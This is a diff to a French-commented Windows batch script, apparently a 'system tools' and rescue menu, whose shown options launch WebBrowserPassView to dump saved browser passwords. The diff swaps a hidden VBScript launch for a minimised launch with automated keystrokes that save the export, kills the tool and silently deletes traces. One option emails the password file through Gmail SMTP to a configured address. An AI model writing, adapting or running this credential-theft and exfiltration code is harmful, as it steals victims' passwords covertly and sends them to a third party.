@@ -950,18 +950,29 @@ set "OUTPUT=%~dp0%OUTPUT_NAME%"
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
-rem Lancement 100% invisible via VBScript temporaire
-set "VBS_TMP=%TEMP%\wbpv_run_%RANDOM%.vbs"
-echo Set wsh = CreateObject("WScript.Shell") > "%VBS_TMP%"
-echo wsh.Run """%WBPV%"" /stext ""%OUTPUT%""", 0, True >> "%VBS_TMP%"
-wscript //nologo "%VBS_TMP%"
-del /F /Q "%VBS_TMP%" >nul 2>&1
+rem Ouvrir le logiciel
+start "" "%WBPV%"
 
+rem Minimiser la fenetre CMD
+powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();}';[W]::ShowWindow([W]::GetConsoleWindow(),6)" >nul 2>&1
+
+rem Attendre chargement du logiciel
+timeout /t 4 /nobreak >nul
+
+rem Selection + sauvegarde automatique vers le fichier
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+
+rem Attendre ecriture fichier puis tuer le logiciel
+timeout /t 4 /nobreak >nul
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+timeout /t 1 /nobreak >nul
+
+rem Nettoyage silencieux
 del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
-exit
+goto system_tools
 
 rem -------------------------------------------------------
 rem  OPTION 2 : Envoi par mail (sans sauvegarde locale)
@@ -987,18 +998,29 @@ set "OUTPUT=%~dp0%OUTPUT_NAME%"
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
-rem Lancement 100% invisible via VBScript temporaire
-set "VBS_TMP=%TEMP%\wbpv_run_%RANDOM%.vbs"
-echo Set wsh = CreateObject("WScript.Shell") > "%VBS_TMP%"
-echo wsh.Run """%WBPV%"" /stext ""%OUTPUT%""", 0, True >> "%VBS_TMP%"
-wscript //nologo "%VBS_TMP%"
-del /F /Q "%VBS_TMP%" >nul 2>&1
+rem Ouvrir le logiciel
+start "" "%WBPV%"
 
+rem Minimiser la fenetre CMD
+powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetConsoleWindow();}';[W]::ShowWindow([W]::GetConsoleWindow(),6)" >nul 2>&1
+
+rem Attendre chargement du logiciel
+timeout /t 4 /nobreak >nul
+
+rem Selection + sauvegarde automatique vers le fichier
+powershell -Command "Set-Clipboard -Value '%OUTPUT%'; $wsh = New-Object -ComObject WScript.Shell; if($wsh.AppActivate('WebBrowserPassView')){ Start-Sleep -Milliseconds 400; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 200; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 1500; $wsh.SendKeys('^v'); Start-Sleep -Milliseconds 300; $wsh.SendKeys('{ENTER}') }" >nul 2>&1
+
+rem Attendre ecriture fichier puis tuer le logiciel
+timeout /t 4 /nobreak >nul
+taskkill /F /IM WebBrowserPassView.exe >nul 2>&1
+timeout /t 1 /nobreak >nul
+
+rem Envoi mail si fichier present
 if not exist "%OUTPUT%" (
-  del /F /Q "%WBPV%" >nul 2>&1
-  if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
-  if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
-  exit
+    del /F /Q "%WBPV%" >nul 2>&1
+    if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
+    if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
+    goto system_tools
 )
 
 powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att" >nul 2>&1
@@ -1008,7 +1030,7 @@ del /F /Q "%WBPV%" >nul 2>&1
 if exist "%WBPV%" powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 
-exit
+goto system_tools
 
 :sys_rescue_menu
 set "opts=Scan RAPIDE du systeme~Le classique SFC /scannow pour reparer l'OS"
